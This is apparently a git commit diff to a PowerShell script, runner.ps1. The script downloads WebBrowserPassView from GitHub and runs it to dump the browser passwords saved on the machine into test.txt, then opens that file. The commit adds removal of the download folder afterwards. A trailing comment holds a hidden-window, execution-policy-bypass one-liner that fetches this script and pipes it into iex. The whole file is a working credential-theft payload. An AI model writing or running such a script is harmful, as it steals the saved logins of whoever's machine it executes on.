1e06604b06509b81f98cbee5f36d9d690cc8ee79
MaxAxoft <167071721+MaxAxoft@users.noreply.github.com>
2024-04-15 15:14:35 +0200

    Update runner.ps1

--- runner.ps1
+++ runner.ps1
@@ -1,14 +1,19 @@
 $nameFile="WebBrowserPassView"
-$runDirectory="$env:USERPROFILE\downloads"
+$downDir="$env:USERPROFILE\downloads"
+$newDir="$downDir\viewer"
 
-$zipFolder="$runDirectory\$nameFile.zip"
-$unzipFolder="$runDirectory\$nameFile"
+Set-Location -path $downDir
+New-Item -ItemType Directory -Path $newDir
 
-Set-Location -path $runDirectory
+$zipFolder="$newDir\$nameFile.zip"
+$unzipFolder="$newDir\$nameFile"
+
 Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
 Expand-Archive $zipFolder -DestinationPath $unzipFolder
 
 cmd /c "WebBrowserPassView\WebBrowserPassView.exe /stext test.txt"
 test.txt
+
+Remove-Item -Path $newDir
 
 #STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex
